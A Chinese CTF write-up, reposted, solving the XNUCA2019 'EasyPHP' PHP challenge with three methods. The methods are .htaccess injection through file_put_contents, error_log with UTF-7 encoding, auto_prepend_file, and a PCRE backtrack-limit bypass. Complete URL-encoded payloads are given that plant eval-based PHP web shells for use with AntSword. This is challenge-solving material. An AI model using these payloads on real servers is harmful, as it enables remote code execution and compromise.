---
title: '[XNUCA2019Qualifier]EasyPHP'
date: 2024-09-24 19:14:22
tags:
categories: 刷题笔记
---

## [XNUCA2019Qualifier]EasyPHP

转载：https://www.cnblogs.com/Article-kelp/p/14998652.html

![image-20240924192819100](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241928229.png)

我们进行代码审计

首先对当前访问的php页面文件(index.php)所在文件夹进行遍历，获取的结果为当前目录中的文件名和文件夹名，接着在结果筛选出文件名，对文件名进行判断，文件名不为"index.php"的文件都会被删除。

<!--more-->

包含文件fl3g.php，如果未使用GET方式对参数content和参数filename传值则显示当前PHP文件源码并结束程序。

接收GET方式对参数content传值，并赋值给变量content，对content的值进行检测，如果含有"on","html","type","flag","upload","file"则会结束程序。

接收GET方式对参数filename传值，并赋值给变量filename，并限制filename的值仅能使用小写字符和符号"."，如果含有其他字符则会结束程序。

再次对当前目录下文件执行代码刚开始部分相同的筛选删除。

将变量filename作为文件名，变量content拼接上字符串"\nJust one chance"后作为文件内容写入该文件，但对于file_put_contents来说传入的文件名必须存在对应的文件才能写入，不存在对应文件时并不会创建。

我们写了一句话，然后访问发现并不会被当成PHP文件解析。随后在对应的源代码配置中发现，设定了只能访问目录下的index.php时PHP引擎才会开启

![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624172635442-301253884.png)

所以我们只能使用.htacceess

**预期解**

.htaccess中可以配置不封apache指令，这部分指令不需要重启服务器就能生效，利用.htaccess实际上就是利用apache中那些.htaccess有权配置的指令

也就是权限为下图中两者的指令

![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624175035097-1194863416.png)

这里找到了error_log指令，可以用来写文件

![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624173900023-1321780453.png)

error_log是依靠出现错误来触发写日志的，所以最好让error_log把所有等级的错误均写成日志，这样方便我们写入，而error_reporting就能设置写入日志需要的错误等级

![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624174217806-97412359.png)

其中当参数为32767时，表示为所有等级的错误

![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624174457100-533912946.png)

 那如何控制我们写如的内容呢？显然是通过报错，这里师傅们采用的是修改include函数的默认路径。

[![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624175532985-1514266884.png)](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624175532985-1514266884.png)

 在include函数中我们可以直接include("当前目录下文件名")来使用就是因为定义了默认路径为"./"即当前目录，如果把这个值修改为不存在的路径时，include包含这个路径便会报错。

![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624204942561-1219345260.png)

像这样的错误信息便会被写入文件，如果把phpcode换一句话，便能够扩大使用面。

最后我们还需要注意我们写入时，写入的内容会接上"\nJust one chance"，在.htaccess中出现不符合的apache语法的字符时会导致错误，这时我们访问在这个错误.htaccess作用范围内的页面均会返回500。

[![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624210134804-1675590273.png)](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624210134804-1675590273.png)

在apache中#代表单行注释符 ，而\代表命令换行，所以我们可以在末尾加上#\，这个时候虽然换行但仍能被注释，效果如下图。

[![img](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624212758590-615438164.png)](https://img2020.cnblogs.com/blog/2293037/202106/2293037-20210624212758590-615438164.png)

我们可以在.htaccess文件的末尾加上#\，此时再写入文件的这部分是，#\\nJust one chance所以我们现在要写入的一个.htaccess文件，其包含内容如下图所示(error_log和include_path这种所填入的路径是不必用引号包裹的，但由于我们在此处利用时会使用其他正常路径时并不会出现的字符故进而会导致500，所以应该用引号包裹(单引号和双引号都是可行的))。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711093110119-1346153953.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711093110119-1346153953.png)

值得注意的是经过不完全测试发现仅三个目录有增删文件的权限，这三个目录分别是/tmp/、/var/tmp/和/var/www/html/(即我们当前储存PHP代码的文件夹)，其他目录由于没有增删文件的权限所以我们error_log也因无法在这些目录下创建日志文件而失效(对于tmp文件夹或许是出于临时储存的需求所以需要的权限较低?并没有找到关于这点相关资料，但看师傅们都选择了/tmp/)。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210710221800458-623831587.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210710221800458-623831587.png)

 (其他两个目录同样可行)

此外我们传入的方式是GET方式，在URL中实现传入，所以得把这些内容进行必要URL编码(包括换行，因为.htaccess只能是一行一条命令)后再传入，换行替换为%0d%0a，#替换为%23，?替换为%3f。

处理后完整的payload为：

```
?filename=.htaccess&content=php_value%20include_path%20"./test/<%3fphp%20phpinfo();%3f>"%0d%0aphp_value%20error_log%20"/tmp/fl3g.php"%0d%0aphp_value%20error_reporting%2032767%0d%0a%23\
```

。传入后接着再访问一次(携带与不携带payload均是可行的)，此时由于include_path的设定，include函数包含错误便会记录在日志中。

但此时我们的payload并不可直接使用，在写入日志时符号"<"与">"被进行了HTML转义，我们的php代码也就不会被识别。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711093654826-1959133108.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711093654826-1959133108.png)

所以我们需要采用一种绕过方式，这里师傅们采用的是UTF-7编码的方式，先来看下wiki百科对UTF-7编码的解释：[UTF-7 - 维基百科，自由的百科全书 (wikipedia.org)](https://zh.wikipedia.org/wiki/UTF-7)(需要梯子)。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711094534748-1005896214.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711094534748-1005896214.png)

其编码实际上可以看作是另外一种形式的base64编码，这就意味着对于一个标准的UTF-8编码后字符串，如"+ADs-"在去掉首尾的+和-后可以通过直接的base64解码得到对应字符(虽然由于编码原理会出现多余字符串)，但注意反向处理并不会得到UTF-7的编码的。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711101255983-1296324411.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711101255983-1296324411.png)

 

 

对于UTF-7编码来说，一个标准得UTF-7编码后字符串应该由+开头由-结尾，实际用于PHP解码时保留开头得+即可保证一个UTF-7编码后字符串被识别，但这部分不知道为何没有在中文wiki中说明，在英文wiki中却能找到相关描述：[UTF-7 - Wikipedia](https://en.wikipedia.org/wiki/UTF-7)。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711101852834-1510070619.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711101852834-1510070619.png)

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711094408184-1789180874.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711094408184-1789180874.png)

对于UTF-7编码来说，最方便得编码和解码方式还是利用PHP自带得函数来处理(mb_convert_encoding需要PHP将mbstring库打开后才能使用，否则会提示函数未定义)。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711103336252-779971625.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711103336252-779971625.png)

 

 

回到符号"<"和">"会被HTML转义的问题上来，我们可以使用其UTF-7编码的格式，同时开启PHP对UTF-7编码的解码，这样就能绕过了。

所以经过UTF-7编码后我们的payload如下所示。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711133627005-96004381.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711133627005-96004381.png)

需要注意的是__halt_compiler函数用来终端编译器的执行，如果我们不带上这个函数的话包含我们的日志文件会导致500甚至崩掉(但本地复现却不会有点搞不懂)。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711132353976-649361991.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711132353976-649361991.png)

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711132605225-595083760.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711132605225-595083760.png)

而URL编码处理后payload则是：

```
?filename=.htaccess&content=php_value include_path "/tmp/%2bADw-%3fphp eval($_GET[code]);__halt_compiler();"%0d%0aphp_value error_reporting 32767%0d%0aphp_value error_log /tmp/fl3g.php%0d%0a%23\
```

接着我们再访问一次触发include包含的错误路径并记录在日志中，然后我们就需要再写入一个新的.htaccess文件设置让日志中我们的UTF-7编码能够被解码，从而我们PHP代码才能被解析。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711105345787-1359566987.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711105345787-1359566987.png)

 

zend.multibyte决定是否开启编码的检测和解析，zend.script_encoding决定采用什么编码，所以我们需要写入的第二个.htaccess文件如下。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711141314424-155101893.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711141314424-155101893.png)

 

 URL编码后的payload：php_value include_path "/tmp"%0d%0aphp_value zend.multibyte 1%0d%0aphp_value zend.script_encoding "UTF-7"%0d%0a%23\

接着我们便可以来使用一句话了来读取flag了，需要注意的是题目源码说明会删除当前目录下非index.php的所有文件，所以我们再使用一句话之前必须得传一遍第二个.htaccess文件的内容(.htaccess中的设置会在PHP文件执行之前被加载，所以不用担心删除导致.htaccess在本次访问时不生效)。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711142008436-454473122.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711142008436-454473122.png)

**非预期解1**

 在.htaccess中#表示注释符号的意思，所以我们可以将一句话放在#后面，再让PHP文件包含.htaccess，此外再使用符号"\"换行的功能绕过对关键词file的检测，再让我们每次访问时均生成这样一个.htaccess，这样就能得到一个可以用在蚁剑上的一句话了。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711144729173-1750041193.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711144729173-1750041193.png)

 

URL编码后：

php_value auto_prepend_fi/%0d%0ale ".htaccess"%0d%0a#<?php eval($_POST[cmd]);?>/

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711150822434-306899981.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711150822434-306899981.png)

 

 [![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711151003081-1482018499.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210711151003081-1482018499.png)

**非预期解2**

采用了关于PHP正则回溯绕过的知识，具体内容可以参考下博主写的另外一篇博客：[关于PHP正则回溯次数绕过 - Article_kelp - 博客园 (cnblogs.com)](https://www.cnblogs.com/Article-kelp/p/15013384.html)

源码中有一段使用了正则匹配过滤，恰好这段正则匹配设置好后肯定会触发回溯：

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715112913835-1035551075.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715112913835-1035551075.png)

 

先在.htaccess把正则限制的配置改到最低：

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715112944655-2090635575.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715112944655-2090635575.png)

 

 URL编码后的的整体payload为：

```
?filename=.htaccess&content=php_value pcre.backtrack_limit 0%0d%0aphp_value pcre.jit 0%0d%0a%23\
```

这个时候我们就能直接上传fl3g.php了，在fl3g.php中写上一句话之后就能为我们所用了。但是要注意传到当前目录是不行的，源码表明了会清除当前目录下非index.php文件，这里选择根目录下的tmp文件上传。

URL编码后的整体payload为：?filename=/tmp/fl3g.php&content=<%3fphp eval($_POST['cmd']);%3f>

再上传一个.htaccess文件，修改设置include_path为/tmp

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715113858114-961307834.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715113858114-961307834.png)

URL编码后的整体payload为：?filename=.htaccess&content=php_value include_path "/tmp"%0d%0a%23\

这样我们就能使用一句话了，但需要注意index.php会清除当前目录下非index.php文件，所以连蚁剑是需要注意把上面那句修改include_path的payload也带上，保证每次访问都会生成一个新的.htaccess，这样即使会删除也没问题了(虽然连接上稍微有些问题，一次连接成功后会有一次连接失败但是这是确实可行的，只是蚁剑操作上需要重复几次)。

[![img](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715114456881-30164572.png)](https://img2020.cnblogs.com/blog/2293037/202107/2293037-20210715114456881-30164572.png)

 

 然后去根目录就能看到flag文件了(虽然打开的操作可能刚好是连接失败时发出的，但打开几次或者刷新就行了)。
